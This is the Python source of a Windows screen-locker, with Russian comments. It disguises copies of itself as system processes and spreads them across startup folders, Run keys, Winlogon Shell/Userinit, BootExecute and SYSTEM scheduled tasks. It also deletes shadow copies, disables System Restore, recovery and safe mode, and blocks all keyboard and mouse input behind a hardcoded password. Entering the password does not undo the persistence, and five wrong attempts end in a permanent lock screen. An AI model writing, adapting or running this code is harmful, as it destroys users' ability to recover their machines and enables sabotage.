import tkinter as tk
import threading
import time
import os
import sys
import shutil
import subprocess
import ctypes
import random
from ctypes import wintypes

# ========== НАСТРОЙКИ ==========
PASSWORD = "12345GOG"
attempts = 0
MAX_ATTEMPTS = 5  # ← ТОЛЬКО ЭТО ИЗМЕНИЛ (БЫЛО 3, СТАЛО 5)
# ================================

# ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ========== АВТОЗАГРУЗКА В 10+ МЕСТ ==========

def add_to_startup_apocalypse():
    """Добавляет программу во ВСЕ возможные места"""
    try:
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)
        
        # Меняем имя файла при копировании (чтобы сложнее было найти)
        names = ['svchost.exe', 'winlogon.exe', 'lsass.exe', 'services.exe',
                'explorer.exe', 'taskhost.exe', 'csrss.exe', 'spoolsv.exe']
        
        # 1-5. Папки автозагрузки (разные места)
        startup_locations = [
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            os.path.join(os.environ['USERPROFILE'], 'Start Menu', 'Programs', 'Startup'),
            'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
            os.path.join(os.environ['ALLUSERSPROFILE'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        ]
        
        for loc in startup_locations:
            if os.path.exists(loc):
                for name in names[:2]:  # По 2 копии в каждой папке
                    try:
                        shutil.copy2(current_file, os.path.join(loc, name))
                    except:
                        pass
        
        # 6-8. Реестр HKCU (несколько записей)
        run_paths = [
            'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
            'Software\\Microsoft\\Windows\\CurrentVersion\\RunServices'
        ]
        
        for run_path in run_paths:
            for name in names[:3]:
                try:
                    subprocess.run(
                        f'reg add "HKCU\\{run_path}" /v "{name}" /t REG_SZ /d "{os.path.join(startup_locations[0], name)}" /f',
                        shell=True
                    )
                except:
                    pass
        
        # 9-11. Реестр HKLM (если есть права)
        if is_admin():
            hklm_paths = [
                'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
                'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices',
                'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run'
            ]
            
            for run_path in hklm_paths:
                for name in names[:3]:
                    try:
                        subprocess.run(
                            f'reg add "HKLM\\{run_path}" /v "{name}" /t REG_SZ /d "{os.path.join(startup_locations[0], name)}" /f',
                            shell=True
                        )
                    except:
                        pass
        
        # 12-14. Планировщик задач (несколько задач)
        task_names = ['WindowsUpdate', 'MicrosoftSecurity', 'SystemMaintenance',
                     'UserTask', 'BackgroundTask', 'CriticalProcess']
        
        for task_name in task_names:
            try:
                subprocess.run(
                    f'schtasks /create /tn "{task_name}" /tr "{os.path.join(startup_locations[0], names[0])}" /sc onlogon /ru "SYSTEM" /f /rl HIGHEST',
                    shell=True
                )
            except:
                pass
        
        # 15. Winlogon (запуск при входе в систему)
        try:
            subprocess.run(
                f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Shell" /t REG_SZ /d "{os.path.join(startup_locations[0], names[0])}, explorer.exe" /f',
                shell=True
            )
        except:
            pass
        
        # 16. Boot Execute (запуск при загрузке)
        try:
            subprocess.run(
                f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk * {os.path.join(startup_locations[0], names[0])}" /f',
                shell=True
            )
        except:
            pass
        
        # 17. Userinit
        try:
            subprocess.run(
                f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Userinit" /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,{os.path.join(startup_locations[0], names[0])}" /f',
                shell=True
            )
        except:
            pass
        
    except:
        pass

# ========== УНИЧТОЖЕНИЕ БЕЗОПАСНОГО РЕЖИМА ==========

def destroy_safe_mode():
    """Делает безопасный режим бесполезным"""
    try:
        if is_admin():
            # Отключаем восстановление системы
            subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f', shell=True)
            
            # Удаляем точки восстановления
            subprocess.run('vssadmin delete shadows /all /quiet', shell=True)
            
            # Отключаем F8 при загрузке
            subprocess.run('bcdedit /set {current} bootmenupolicy standard', shell=True)
            
            # Устанавливаем таймаут загрузки в 0
            subprocess.run('bcdedit /timeout 0', shell=True)
            
            # Блокируем доступ к безопасному режиму через msconfig
            subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v SafeModeBlock /t REG_DWORD /d 1 /f', shell=True)
            
            # Отключаем восстановление при загрузке
            subprocess.run('reagentc /disable', shell=True)
    except:
        pass

# ========== ТОТАЛЬНАЯ БЛОКИРОВКА КЛАВИШ ==========

def block_absolutely_everything():
    """Блокирует АБСОЛЮТНО ВСЕ клавиши, включая мышь"""
    try:
        import keyboard
        import mouse
        
        # Все мыслимые клавиши
        all_keys = [
            'alt', 'ctrl', 'shift', 'windows', 'delete', 'escape', 'tab', 'enter',
            'backspace', 'space', 'caps_lock', 'num_lock', 'scroll_lock',
            'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
            'up', 'down', 'left', 'right', 'home', 'end', 'page_up', 'page_down',
            'insert', 'print_screen', 'pause', 'menu', 'alt gr', 'win', 'apps',
            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            '[', ']', '\\', ';', "'", ',', '.', '/', '-', '=', '`'
        ]
        
        for key in all_keys:
            try:
                keyboard.block_key(key)
            except:
                pass
        
        # Блокируем мышь полностью
        try:
            mouse.block(button='left')
            mouse.block(button='right')
            mouse.block(button='middle')
            mouse.block(button='x1')
            mouse.block(button='x2')
        except:
            pass
        
        # Все возможные комбинации
        all_combos = [
            'alt+f4', 'ctrl+alt+del', 'ctrl+shift+esc', 'ctrl+esc',
            'alt+tab', 'windows+r', 'windows+e', 'windows+d', 'windows+l',
            'windows+tab', 'windows+space', 'windows+up', 'windows+down',
            'alt+space', 'ctrl+c', 'ctrl+v', 'ctrl+x', 'ctrl+z',
            'ctrl+a', 'ctrl+s', 'ctrl+o', 'ctrl+p', 'ctrl+w',
            'ctrl+tab', 'ctrl+shift', 'alt+shift', 'win+space',
            'alt+enter', 'shift+f10', 'ctrl+alt+tab'
        ]
        
        for combo in all_combos:
            try:
                keyboard.add_hotkey(combo, lambda: None)
            except:
                pass
    except:
        pass

# ========== API БЛОКИРОВКА ВВОДА ==========

def block_input_api():
    """Блокирует весь ввод через Windows API"""
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

# ========== ОКНО ==========

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')
root.overrideredirect(True)

canvas = tk.Canvas(root, width=root.winfo_screenwidth(), 
                  height=root.winfo_screenheight(), 
                  bg='black', highlightthickness=0)
canvas.pack()

# ========== ИНТЕРФЕЙС (МИНИМАЛИСТИЧНЫЙ) ==========

def draw_ui():
    canvas.delete("all")
    
    cx = root.winfo_screenwidth() // 2
    cy = root.winfo_screenheight() // 2
    
    # Только самое важное
    canvas.create_text(cx, cy-100, text="⛔ SYSTEM LOCKED ⛔", 
                      fill='red', font=("Courier", 32, "bold"))
    
    canvas.create_text(cx, cy-30, text="THIS COMPUTER IS PERMANENTLY LOCKED", 
                      fill='red', font=("Courier", 18))
    
    canvas.create_text(cx, cy+30, text=f"ATTEMPTS: {attempts}/{MAX_ATTEMPTS}", 
                      fill='red', font=("Courier", 16))
    
    canvas.create_text(cx, cy+80, text=f"AFTER {MAX_ATTEMPTS} FAILED ATTEMPTS:", 
                      fill='yellow', font=("Courier", 14))
    
    canvas.create_text(cx, cy+120, text="ONLY REINSTALL WINDOWS WILL HELP", 
                      fill='yellow', font=("Courier", 14, "bold"))
    
    canvas.create_text(cx, cy+180, text="ENTER PASSWORD TO UNLOCK:", 
                      fill='#00ff00', font=("Courier", 12))

# ПОЛЕ ВВОДА (единственное, что работает)
entry = tk.Entry(root, font=("Courier", 16), show="*", 
                width=12, justify='center', bg='black', fg='#00ff00', 
                insertbackground='#00ff00', bd=0)
entry.place(relx=0.5, rely=0.7, anchor='center')
entry.focus()

error_label = tk.Label(root, text="", font=("Courier", 10), 
                      fg='red', bg='black')
error_label.place(relx=0.5, rely=0.78, anchor='center')

# ========== КОНЕЦ ИГРЫ ==========

def game_over():
    """Финальный экран - только переустановка"""
    canvas.delete("all")
    canvas.configure(bg='black')
    
    cx = root.winfo_screenwidth() // 2
    cy = root.winfo_screenheight() // 2
    
    canvas.create_text(cx, cy-150, text="💀 GAME OVER 💀", 
                      fill='red', font=("Courier", 60, "bold"))
    
    canvas.create_text(cx, cy-50, text=f"YOU HAVE FAILED {MAX_ATTEMPTS} TIMES", 
                      fill='red', font=("Courier", 30))
    
    canvas.create_text(cx, cy+30, text="THIS COMPUTER IS NOW PERMANENTLY LOCKED", 
                      fill='red', font=("Courier", 18))
    
    canvas.create_text(cx, cy+100, text="🔒 THE ONLY SOLUTION: 🔒", 
                      fill='yellow', font=("Courier", 20, "bold"))
    
    canvas.create_text(cx, cy+160, text="REINSTALL WINDOWS", 
                      fill='red', font=("Courier", 28, "bold"))
    
    canvas.create_text(cx, cy+230, text="Safe Mode is disabled", 
                      fill='#660000', font=("Courier", 14))
    
    canvas.create_text(cx, cy+260, text="System Restore is disabled", 
                      fill='#660000', font=("Courier", 14))
    
    canvas.create_text(cx, cy+290, text="All startup locations infected", 
                      fill='#660000', font=("Courier", 14))
    
    entry.place_forget()
    error_label.place_forget()
    
    # Бесконечный цикл - программа не закроется
    while True:
        root.update()
        time.sleep(1)

# ========== ПРОВЕРКА ПАРОЛЯ ==========

def check_password(event=None):
    global attempts
    
    if entry.get() == PASSWORD:
        # Выход (но уже поздно - система убита)
        root.destroy()
        sys.exit()
    else:
        attempts += 1
        error_label.config(text=f"❌ ACCESS DENIED! {attempts}/{MAX_ATTEMPTS}")
        entry.delete(0, tk.END)
        draw_ui()
        
        if attempts >= MAX_ATTEMPTS:
            game_over()

# ========== ПЕРЕХВАТ ВСЕГО ==========

def block_all_keys(event):
    """Блокирует всё, кроме поля ввода"""
    if event.keysym == 'Return':
        check_password()
        return "break"
    
    if event.widget == entry and len(event.char) > 0:
        return
    
    return "break"

# ========== ЗАПУСК АПОКАЛИПСИСА ==========

draw_ui()

# Запускаем все механизмы
if is_admin():
    destroy_safe_mode()
    add_to_startup_apocalypse()
    threading.Thread(target=block_input_api, daemon=True).start()

threading.Thread(target=block_absolutely_everything, daemon=True).start()

# Перехват клавиш
root.bind_all('<Key>', block_all_keys)
root.bind_all('<KeyRelease>', block_all_keys)

root.mainloop()